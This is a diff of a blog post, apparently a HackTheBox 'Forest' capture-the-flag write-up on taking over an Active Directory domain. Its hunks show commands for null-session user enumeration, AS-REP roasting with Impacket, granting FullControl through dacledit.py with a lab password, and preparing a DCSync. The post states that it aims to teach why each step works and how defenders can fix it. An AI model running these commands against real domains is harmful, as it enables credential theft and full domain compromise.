@@ -1,16 +1,16 @@
 ---
 title: "HTB: Forest — AS-REP Roasting to Domain Admin"
 date: 2026-05-08
-summary: "A walkthrough of HackTheBox Forest, demonstrating the canonical AS-REP roast → BloodHound → DCSync attack chain on a misconfigured Active Directory environment."
+summary: "A walkthrough of HackTheBox Forest, demonstrating an AS-REP roast → BloodHound → DCSync attack chain on a misconfigured Active Directory environment."
 tags: ["htb", "active-directory", "kerberos", "bloodhound"]
 draft: false
 ---
 
 Forest is a retired HackTheBox machine that simulates a small Active Directory environment with a misconfigured service account and an over-privileged Exchange security group.
 
-The path from zero access to Domain Admin runs through five steps: anonymous RPC enumeration to extract a user list, an AS-REP roast to recover one user's password hash, a foothold via WinRM, BloodHound enumeration to find a chain of inherited permissions, and a final DCSync attack to retrieve the Administrator credentials. The chain is a perfect example of how small Active Directory misconfigurations compound into total domain compromise.
+The path from zero access to Domain Admin runs through five steps: `anonymous RPC enumeration` to extract a user list, an `AS-REP roast` to recover one user's password hash, a `foothold via WinRM`, `BloodHound enumeration` to find a chain of inherited permissions, and a final `DCSync attack` to retrieve the Administrator credentials. The chain is a perfect example of how small Active Directory misconfigurations compound into total domain compromise.
 
-If you're after the flag, plenty of other writeups will get you there faster. My goal with this one (and with the writeups to come) is to go further: explain *why* each step works, and turn each finding into a remediation a defender could actually act on.
+If you're after the flag, plenty of other writeups will get you there faster. My goal with this one (and with the writeups to come) is to go further: explain *why* each step works, and turn each finding into a remediation a defender could *actually* act on.
 
 ## Recon
 
@@ -55,8 +55,20 @@ $ echo "10.129.95.210 forest.htb.local htb.local" | sudo tee -a /etc/hosts
 ```
 ```bash
 $ enum4linux-ng -A 10.129.95.210
+
+...[Trimmed to the Relevant section:]....
+ ======================================
+|    Users via RPC on 10.129.95.210    |
+ ======================================
+[*] Enumerating users via 'querydispinfo'
+[+] Found 31 user(s) via 'querydispinfo'
+[*] Enumerating users via 'enumdomusers'
+[+] Found 31 user(s) via 'enumdomusers'
+[+] After merging user results we have 31 user(s) total:
+
+...[Continue]....
 ```
-![enum4linux-ng shows rpc null user enum](/img/writeups/forest/forest-enum4linux-rpcinfo.png)
+
 RPC allows null sessions. That means I can pull a list of users without credentials. This is a serious finding on its own and a foothold opportunity.
 
 ## User Enumeration & AS-REP Roasting
@@ -102,7 +114,7 @@ We can check for AS-REP roastable users with Impacket's GetNPUsers command.
 ```bash
 $ impacket-GetNPUsers htb.local/ -no-pass -usersfile usernames.txt -dc-ip 10.129.95.210
 ```
-To our surprise the service account *svc-alfresco* is vulnerable!
+To our surprise the service account `svc-alfresco` is vulnerable!
 ```
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:[HASH-REDACTED]
 ```
@@ -182,7 +194,7 @@ Now that svc-alfresco is part of the Exchange Windows Permissions group, we can 
 ```bash
 $ dacledit.py -action 'write' -rights 'FullControl' -principal 'svc-alfresco' -target-sid 'S-1-5-21-XXXX-XXXX-XXXX' 'HTB.LOCAL'/'svc-alfresco':'s3rvice'
 ```
-In this command we are saying we want to "write" or "give" the *FullControl* rights to svc-alfresco on the domain specified by the -target-sid(Security Identifier). The command ends with the credentials to authenticate.
+In this command we are saying we want to "write" or "give" the FullControl rights to svc-alfresco on the domain specified by the -target-sid (Security Identifier). The command ends with the credentials to authenticate.
 
 With FullControl over the domain we can perform a DCSync attack with Impacket's Secretsdump.
 ```bash
